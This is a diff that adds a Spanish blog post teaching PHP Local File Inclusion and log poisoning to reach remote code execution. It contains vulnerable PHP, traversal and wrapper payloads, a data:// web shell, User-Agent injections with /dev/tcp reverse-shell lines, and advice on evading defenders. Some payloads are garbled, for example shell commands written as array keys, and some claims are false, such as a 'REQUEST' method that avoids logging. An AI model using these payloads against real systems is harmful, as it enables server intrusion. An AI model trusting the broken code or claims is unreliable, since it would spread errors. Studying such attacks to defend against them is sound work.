@@ -1,0 +1,123 @@
+---
+title:  "Welcome to Jekyll!"
+header:
+  teaser: "/assets/images/logo.jpeg"
+categories: 
+  - Jekyll
+tags:
+  - update
+---
+
+Antes de empezar explicando como conseguir RCE explotando una vulnerabilidad de Inclusión de archivos locales, primero necesitamos saber que es y como funciona.
+“Local File Inclusion” es una vulnerabilidad que te permite incluir archivos locales a un servidor a causa de una mala programación en cuanto a “back-end”, esta vulnerabilidad está presente en PHP, JSP, ASP entre otros.
+
+## Explotación de la vulnerabilidad
+
+Imaginemos que tenemos este código en un archivo PHP.
+
+```php
+<?php 
+   $file = $_GET['file'];
+   if(isset($file)) 
+   { 
+   include("$file"); 
+   } 
+?>
+```
+
+Este código es vulnerable a LFI porque estamos declarando el parámetro “file” sin ningún tipo de sanitización, por lo tanto nos permitiría incluir archivos en el servidor.
+
+**Petición Legítima:**
+
+```php
+http://192.168.1.144/test.php?file=contact.php
+```
+
+**Petición malintencionada:**
+
+```php
+http://192.168.1.144/test.php?file=/etc/hosts
+```
+
+Como vemos en la segunda petición que tramitamos al servidor web es diferente a la primera, en la segunda estamos explotando un LFI en toda regla, por lo que la respuesta de parte del servidor es un 200 OK, es decir el recurso solicitado existe, en este caso nos devolvería el contenido del archivo “/etc/hosts”.
+
+Hay programadores que reconocen este tipo de vulnerabilidad web e intentan sanitizar el código de alguna manera:
+
+```php
+<?php 
+   $file = $_GET['file'];
+   if(isset($file)) 
+   { 
+   include("lib/functions/$file");
+   }
+?>
+```
+
+Aquí solo seria cuestión de hacer un “Directory Path Traversal”, es decir volver directorios atrás para apuntar al recurso solicitado “../../etc/hosts”. Cabe decir que este ejemplo es simple, se puede complicar mucho más.
+
+## Wrapper
+Un "**Wrapper**" en LFI es una envoltura que incorpora PHP, se introduce en la URL al tramitar la petición al servidor legítimo. Hay distintos tipos de "**Wrappers**" y cada uno para una función en específico, los más comunes son:
+
+```php
+expect://: http://192.168.1.144/test.php?file=expect://whoami
+filter://: http://192.168.1.144/test.php?file=php://filter/convert.base64-encode/resource=test.php
+data://: http://192.168.1.144/test.php?file=data:text/plain;,<?php echo shell_exec($_GET[‘cmd’]);?>
+``` 
+
+## ¿Cómo conseguir RCE de un LFI?
+
+Se puede conseguir "**Remote Code Execution**" de distintas formas, pero aquí solo explicaré unas cuantas. En LFI hay una técnica para conseguir RCE llamada "**Log Poisoning**", consiste en envenenarlos .log de Apache o SSH.
+
+Los logs son archivos que dejan registro de lo que haces, un ejemplo seria cuando accedes al servidor web, lo que haces es verificar si el recurso que solicitas existe y eso lo haces mediante una petición de tipo GET, pues eso se queda registrado en estos archivos, cada servicio tiene su propio archivo .log, en este caso nos centraremos solo en Apache y SSH.
+
+Te estarás preguntando ¿Cómo concateno un LFI con un “Log Poisoning”?
+
+**Buena pregunta!!!**, pues es más sencillo de lo que parece. Primero debemos saber cuál es la ruta de estos logs, el archivo de logs de Apache se sitúa en ```/var/log/apache2/access.log``` y el de SSH ```/var/log/auth.log```, le damos permiso de lectura y escritura a la carpeta de los logs de Apache con ```chmod 755/var/log/apache2``` y ```chmod 755 /var/log/auth.log``` para el archivo de los logs de SSH para que podamos visualizar su contenido.
+Bien, tenemos medio trabajo hecho, ahora solo faltaría envenenar estos logs, lo que tendríamos que hacer es tramitar una petición a la ruta donde se encuentran los logs y cambiar el “**UserAgent**”, vamos a utilizar “**BurpSuite**” para hacerlo, también se puede utilizar “**Curl**” para más rapidez. Usaré “**BurpSuite**” para ver como se comporta la petición por detrás y sea más claro.
+
+<p align="center">
+<img src="https://user-images.githubusercontent.com/69093629/120226068-c09dd300-c246-11eb-9300-198cce165d89.png">
+</p>
+
+Como vemos en la foto anterior hemos interceptado la petición con “**BurpSuite**”, ahora la mandamos al “**Repeater**” para modificarla a nuestra manera, cambiamos el “**User-Agent**” y ponemos nuestras sentencias maliciosas en *PHP*:
+
+```php 
+<?php system($_GET['sh >& /dev/tcp/192.168.1.144/443 ']); ?>
+
+<?php shell_exec($_GET['cmd']); ?>
+```
+
+<p align="center">
+<img src="https://user-images.githubusercontent.com/69093629/120226156-efb44480-c246-11eb-8e66-0cea44ec83e8.png">
+</p>
+
+Enviamos la petición maliciosa al servidor y…
+
+<p align="center">
+<img src="https://user-images.githubusercontent.com/69093629/120226181-ffcc2400-c246-11eb-898c-0b9348b621f5.png">
+</p>
+
+Lo malo aquí es que las peticiones se emiten por tipo GET, esto quiere decir que se verían reflejadas en los logs y sería muy fácil para el “**Blue-Team**” pillar-nos, para ponérselos más difícil lo ideal seria cambiar el tipo de petición a POST o REQUEST.
+
+```php
+<?php system($_REQUEST['bash >& /dev/tcp/192.168.1.144/443 ']); ?>
+
+<?php shell_exec($_POST['cmd']); ?>
+```
+
+Utilizando “**Curl**” sería algo un poco más complejo de entender, pero nada del otro mundo:
+
+```php 
+~$ curl -s -X REQUEST -A "<?php system($_REQUEST['whoami']); ?>" "http://192.168.1.144/test.php?file=/var/log/apache2/access.log"
+```
+
+Lo que estamos haciendo es enviar una petición por REQUEST para que no se vea reflejada en él *.log* y en modo “**silent**” para no ver la respuesta de lado del servidor, el parámetro “**-A**” es para modificar el “**UserAgent**” a nuestra manera y por último le especifico a que URL quiero enviarla.
+Para envenenar los logs de SSH es aún más sencillo, en vez de poner un “**user**” en el campo correspondiente para la conexión con SSH, ponemos la sentencia maliciosa de *PHP* entre comillas simples seguida de una arroba y la IP del sistema.
+
+```php
+<?php system(‘whoami’); ?>
+```
+
+<p align="center">
+<img src="https://user-images.githubusercontent.com/69093629/120226346-4b7ecd80-c247-11eb-817b-8eef893fd0d0.png">
+</p>
